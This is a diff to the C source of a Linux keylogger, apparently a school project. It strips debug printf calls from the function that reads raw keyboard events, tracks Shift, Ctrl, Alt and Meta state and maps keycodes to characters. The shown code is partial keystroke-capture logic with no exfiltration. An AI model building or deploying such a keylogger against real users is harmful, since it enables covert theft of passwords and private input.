@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/09/28 05:57:11 by root              #+#    #+#             */
-/*   Updated: 2018/10/08 20:01:12 by gbourgeo         ###   ########.fr       */
+/*   Updated: 2018/10/31 18:37:48 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -528,7 +528,6 @@ static void				keylogger(int keybd, int **key_table, int nb_keys, int nb_keymap)
 			}
 		}
 		if (value == KEY_LEFTSHIFT || value == KEY_RIGHTSHIFT) {
-			printf("SHIFT");
 			if (state == 0)
 				modifier -= ((1 << modifiers[0].bit)); // update position on the character table values
 			else if (state == 1)
@@ -536,7 +535,6 @@ static void				keylogger(int keybd, int **key_table, int nb_keys, int nb_keymap)
 			state = 0;
 		}
 		else if (value == KEY_RIGHTCTRL || value == KEY_LEFTCTRL) {
-			printf("CTRL%d", state);
 			if (state == 0)
 				modifier -= ((1 << modifiers[2].bit)); // update position on the character table values
 			else if (state == 1)
@@ -544,7 +542,6 @@ static void				keylogger(int keybd, int **key_table, int nb_keys, int nb_keymap)
 			state = 0;
 		}
 		else if (value == KEY_LEFTALT) {
-			printf("ALTL");
 			if (state == 0)
 				modifier -= ((1 << modifiers[3].bit)); // update position on the character table values
 			else if (state == 1)
@@ -552,7 +549,6 @@ static void				keylogger(int keybd, int **key_table, int nb_keys, int nb_keymap)
 			state = 0;
 		}
 		else if (value == KEY_RIGHTALT) {
-			printf("ALTR");
 			if (state == 0)
 				modifier -= ((1 << modifiers[1].bit)); // update position on the character table values
 			else if (state == 1)
@@ -560,7 +556,6 @@ static void				keylogger(int keybd, int **key_table, int nb_keys, int nb_keymap)
 //			state = 0;
 		}
 		else if (value == KEY_RIGHTMETA) {
-			printf("cmd %d", (1 << modifiers[8].bit));
 			if (state == 0)
 				modifier -= ((1 << modifiers[8].bit)); // update position on the character table values
 			else if (state == 1)
@@ -589,21 +584,21 @@ static void				keylogger(int keybd, int **key_table, int nb_keys, int nb_keymap)
 			// }
 			key = key_table[value][modifier];
 			// if (isprintable(key))
-			// 	printf("\t%c", key);
+			// 	printf("%c", key);
 			// else
 				print_keysym(key);
 			fflush(stdout);
-			printf(" : key_table[%d][%d] = %d\n", value, modifier, key);
-			for (int j = 0; j < nb_keymap; j++) {
-				printf("%5ld ", key_table[value][j]);
-				print_keysym(key_table[value][j]);
-				printf("(%c)", key_table[value][j]);
-				if (j && j % 5 == 0)
-					printf("\n>");
-				else
-					printf(" | ");
-			}
-			printf("\n");
+			/* printf(" : key_table[%d][%d] = %d\n", value, modifier, key); */
+			/* for (int j = 0; j < nb_keymap; j++) { */
+			/* 	printf("%5ld ", key_table[value][j]); */
+			/* 	print_keysym(key_table[value][j]); */
+			/* 	printf("(%c)", key_table[value][j]); */
+			/* 	if (j && j % 5 == 0) */
+			/* 		printf("\n>"); */
+			/* 	else */
+			/* 		printf(" | "); */
+			/* } */
+			/* printf("\n"); */
 		}
 	}
 }
